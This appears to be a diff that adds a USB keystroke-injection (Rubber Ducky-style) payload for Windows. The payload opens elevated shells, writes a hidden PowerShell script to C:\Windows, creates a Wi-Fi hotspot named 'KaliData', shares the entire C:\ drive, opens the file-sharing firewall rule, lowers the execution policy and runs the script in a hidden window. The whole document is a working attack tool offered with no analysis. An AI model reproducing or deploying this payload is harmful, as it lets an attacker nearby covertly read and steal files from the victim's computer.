@@ -1,0 +1,43 @@
+DELAY 750
+GUI r
+DELAY 750
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 750
+DELAY 750
+ENTER
+DELAY 750
+ENTER
+STRING netsh wlan set hostednetwork mode=allow ssid=KaliData key=PenTester
+ENTER
+STRING netsh wlan start hostednetwork
+ENTER
+ENTER
+STRING $Share = [WmiClass]'Win32_Share'
+ENTER
+STRING $Share.Create('C:\', 'netShare', 0)
+ENTER
+STRING netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
+ENTER
+DELAY 1000
+CTRL s
+ctrl s
+DELAY  2000
+STRING C:\Windows\config-31dbe.ps1
+ENTER
+DELAY 2050
+ALT F4
+DELAY 750
+GUI r
+DELAY 750
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1250
+STRING mode con:cols=14 lines=1
+ENTER
+DELAY 750
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 750
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-31dbe.ps1
+ENTER
